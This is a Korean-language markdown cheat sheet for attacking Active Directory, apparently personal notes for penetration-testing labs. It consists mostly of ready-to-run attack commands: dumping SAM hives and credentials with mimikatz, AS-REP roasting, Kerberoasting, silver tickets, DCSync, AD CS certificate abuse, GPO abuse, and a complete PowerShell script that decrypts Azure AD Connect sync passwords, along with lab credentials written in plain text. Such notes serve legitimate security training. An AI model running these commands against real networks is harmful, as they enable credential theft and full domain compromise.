# Attacking Active Directory
## POST EXPLOITATION
- 모든 내용을 꼼꼼하게 살펴봐야 한다!
- `evil-winrm`에 로그인 상태에서는 실행을 시키지 못하는 프로그램들이 있을 수 있으니 다른 방법으로 로그인 해서 시도.
- users 수집(C:\Users)
- powershell history

```powershell
$historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
$historyPath

# 파일이 존재하는지 확인
Test-Path $historyPath

# 히스토리 내용 보기
Get-Content $historyPath
```
- sam, system dump and cracking

```powershell
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
```

- mimikatz

```powershell
.\mimikatz.exe
privilege::debug
token::elevate
sekurlsa::logonpasswords
```

- winpeas(serivce인지)
- 내부 파일 체크(Documents,C:\에 생성된 폴더,유저들 내부 등 꼼꼼하게 체크 !) 
- netexec에서 오류가 나오면 `--local-auth`를 사용해서 로그인 시도
- netexec smb를 통해서 psexec를 사용하여 셸을 얻을 수 있음.
- `[-] domain.com\user:wrongpass - Login Failed` : 비밀번호가 틀린 것!
- `[-] domain.com\user:password - Account Locked Out` : 너무 많은 시도로 계정이 잠긴 것!
- `nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --pass-pol` : 패스워드 스프레잉 하기 전에 체크

---
## Users and Groups enumeration
```powershell
whoami
# DOMAIN\username : 도메인 계정
# COMPUTERNAME\username : 로컬 계정

net user <user>
ner user <user> /domain
net group <group>
net group <group> /domain
```
---


## SMB Enumeration
```bash
# SMBMap
smbmap -u '' -p '' -H <ip> -r --depth 5

# NetExec (CrackMapExec)
netexec smb [ip] -u guest -p '' --rid-brute
netexec smb <domain> -u <id> -p <password> --users

# Enum4Linux
./enum4linux <ip>
# Account Lockout Threshold: None -> brute force attack possible
```

---

## LDAP Enumeration
```bash
# LDAP Search
ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.160.122" "(objectclass=*)"
ldapsearch -v -x -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -H "ldap://<ip>" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```
- `-x` : 기본 SASL 인증 대신 간단한 익명 또는 아이디-비밀번호 기반 인증을 사용
- `-b` : LDAP 검색을 시작할 루트 경로를 의미. `DC=hutch,DC=offsec` → `hutch.offsec` 도메인을 의미
- `"(objectclass=*)"` : 모든 객체(Object)를 가져오라는 의미

```bash
netexec ldap <domain> -u <id> -p <password> --users
```

---
## rpcclient
```bash
rpcclient -U "" -N <ip>

rpcclient $> enumdomusers
rpcclient $> enumdomgroups

rpcclient $> querygroup 0x200
rpcclient $> querygroupmem 0x200

rpcclient $> queryuser <rid>
```
---
## AS-REP Roasting
```bash
impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hash corp.com/pete
```
- `-dc-ip` : 도메인 컨트롤러(DC)의 IP 주소를 지정
- `-request` : 실제로 AS-REP 요청을 보내 티켓을 가져옴
- `-outputfile` : 덤프한 해시를 저장할 파일 이름
- `corp.com/pete` : 대상 도메인/사용자 계정

```bash
impacket-GetNPUsers -dc-ip <ip> -no-pass <domain>/<user>
```

```powershell
.\Rubeus.exe asreproast /nowrap
```
- `asreproast` : AS-REP Roasting 공격 수행 모드
- `/nowrap` : 해시가 여러 줄로 나뉘지 않고 한 줄로 출력되도록 설정

---

## Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```bash
sudo ntpdate <ip>
```

---

## Kerberoasting
```powershell
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```
- `kerberoast` : Kerberoasting 공격 수행 모드
- `/outfile` : 수집한 해시를 저장할 파일 지정

```bash
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```
- `-request` : SPN에 대해 실제 TGS 요청을 전송
- `-dc-ip` : 도메인 컨트롤러 IP
- `corp.com/pete` : 인증에 사용할 도메인/사용자

```bash
impacket-GetUsersSPNs -request -dc-ip <ip> <domain>/<user> -no-pass
# username만 아는 상태로 시도해볼 것.

./kerbrute_linux_amd64 userenum --dc 192.168.133.40 -d haero /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

---

## Silver Tickets
```powershell
.\mimikatz.exe

privilege::debug

sekurlsa::logonpasswords

whoami /user

kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 '
/domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin

klist

iwr -UseDefaultCredentials http://web04
```

**설명:**
- `privilege::debug` : Mimikatz에서 SYSTEM 권한 디버그 권한 획득
- `sekurlsa::logonpasswords` : 현재 로그인된 세션에서 자격 증명 덤프
- `whoami /user` : 현재 사용자 SID 확인
- `kerberos::golden` : 골든/실버 티켓 생성 명령
  - `/sid` : 도메인 SID 지정
  - `/domain` : 도메인 이름
  - `/ptt` : 생성한 티켓을 즉시 메모리에 삽입(Pass-the-Ticket)
  - `/target` : 공격 대상 서비스 호스트
  - `/service` : 서비스 이름 (예: http, cifs 등)
  - `/rc4` : 서비스 계정의 NTLM 해시
  - `/user` : 티켓에 삽입할 사용자 이름
- `klist` : 현재 메모리에 로드된 티켓 확인
- `iwr -UseDefaultCredentials` : 티켓을 이용해 웹 요청

---

## Impacket Secretsdump
```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```
- `-system SYSTEM` : `C:\Windows\System32\config\SYSTEM`
- `LOCAL` : ntds.dit와 SYSTEM 파일을 로컬에서 분석

---

## Domain Controller Synchronization
```powershell
.\mimikatz.exe

lsadump::dcsync /user:corp\Administrator
```
- `lsadump::dcsync` : AD 복제 프로토콜을 악용하여 사용자 해시 요청
- `/user` : 대상 사용자 계정 지정

```bash
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023!"@192.168.50.70
```
- `-just-dc-user` : 특정 사용자만 복제 요청
- `corp.com/jeffadmin` : 인증에 사용할 도메인/계정
- `@192.168.50.70` : 도메인 컨트롤러 IP

---

## CrackMapExec LDAP + BloodHound
```bash
cme ldap hokkaido-aerospace.com -u 'hrapp-service' -p 'Untimed$Runny' --bloodhound -c all -ns 192.168.94.135
```

- Linux/Kali 등에서 바로 실행 가능
- LDAP 기반으로 대부분의 정보를 수집 가능하므로 SharpHound을 직접 업로드하지 않아도 됨

**옵션 설명:**
1. `cme ldap hokkaido-aerospace.com` : LDAP 프로토콜을 사용하여 도메인 컨트롤러와 상호작용
2. `--bloodhound` : CME의 BloodHound 모듈 활성화
3. `-c all` : 모든 수집기를 실행 (유저, 그룹, 컴퓨터, ACL, 세션 등)
4. `-ns 192.168.94.135` : 사용할 DNS 서버 지정 (보통 도메인 컨트롤러)

---

## BloodHound Python
```bash
bloodhound-python -u "hrapp-service" -p 'Untimed$Runny' -d hokkaido-aerospace.com -c all --zip -ns 192.168.208.40
```

---

## Rusthound
```bash
sudo ntpdate <ip>
rusthound-ce -d <domain> -u <user> -p <password>
```

---

## Add Computer
```bash
impacket-addcomputer ignite.local/geet:Password@1 -computer-name fakepc -computer-pass Password@123 -dc-ip 192.168.1.14
```

---

## Linux Ticket Environment
```bash
export KRB5CCNAME=./Administrator.ccache
impacket-psexec -no-pass -k <FQDN(computername.domain.name)>
```

---

## GPO Abuse
```powershell
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName "Default Domain Policy"
gpupdate /force
```
- https://medium.com/@raphaeltzy13/group-policy-object-gpo-abuse-windows-active-directory-privilege-escalation-51d8519a13d7

---

## Certipy-ad (AD CS Exploit)
```bash
certipy-ad shadow auto -u <user> -p <password> -account <account> -dc-ip <ip>

certipy-ad find -u <user> -hashes <hashes> -dc-ip <ip> -vulnerable

certipy-ad find -u <user> -p <password> -target <domain/FQDN> -text -stdout -vulnerable

# ESC16 
certipy-ad account -u <user> -hashes <hashes> -user <CA user> -upn administrator update

certipy-ad account -u <user> -hashes <hashes> -user <CA user> read

certipy-ad req -u <CA user> -hashes <hash> -dc-ip <ip> -target <domain/FQDN> -ca <CA Authority name> -template User

# 사용하기 전에 update 된 CA를 롤백 해줘야할수도 있음
certipy-ad auth -dc-ip <ip> -pfx <pfx file> -u <user> -domain <domain>
```
---
## Certify.exe
```powershell
.\Certify.exe find /vulnerable /currentuser

# currentuser의 enrollment permissions를 확인해보기. -> TGT 발급이 가능해짐.

.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator
```
```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```
```powershell
.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx

.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx /getcredentials /show /nowrap
```

---

## Azure AD Connect

- 서버에 `AAD_*`, `MSOL_*`가 있다면 Azure AD Connect 서버라고 추측할 수 있음
<img width="868" height="485" alt="image" src="https://github.com/user-attachments/assets/30b97330-3c40-4466-ab6d-712ba911ced4" />


### ADSync 서비스 확인
```powershell
# ADSync가 있는지 찾는 과정
Get-Process
tasklist
Get-Service
wmic.exe service get name
sc.exe query state= all
net.exe start
Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\ADSync
```

**ADSync란?**
- 온프레미스(로컬) AD의 계정, 그룹, 비밀번호 해시 등을 Azure AD로 복제(sync)해주는 서비스
- 하나의 계정으로 온프레미스와 클라우드 모두 로그인 가능해짐

### 서비스 상세 정보 확인
```powershell
Get-ItemProperty -Path <service Path> | Format-list -Property * -Force
```
<img width="825" height="286" alt="image" src="https://github.com/user-attachments/assets/fba28c0a-16fa-432e-a6d8-73500cff0775" />

### 1.5.x 버전 (DPAPI 사용)
```powershell
sqlcmd -S MONTEVERDE -Q "use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration"
```
<img width="1117" height="169" alt="image" src="https://github.com/user-attachments/assets/7306dde5-621c-4da0-afa0-7d7cda5c2818" />

### PowerShell 스크립트를 이용한 자격 증명 추출
```powershell
# poc.ps1

Function Get-ADConnectPassword{
Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"

$key_id = 1
$instance_id = [GUID]"1852B527-DD4F-4ECF-B541-EFCCBFF29E31"
$entropy = [GUID]"194EC2FC-F186-46CF-B44D-071EB61F49CD"

$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=MONTEVERDE;Database=ADSync;Trusted_Connection=true"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']"| select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']"| select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name ='Password'; Expression = {$_.node.InnerXML}}
Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
}
```

```powershell
. .\poc.ps1
Get-ADConnectPassword
```
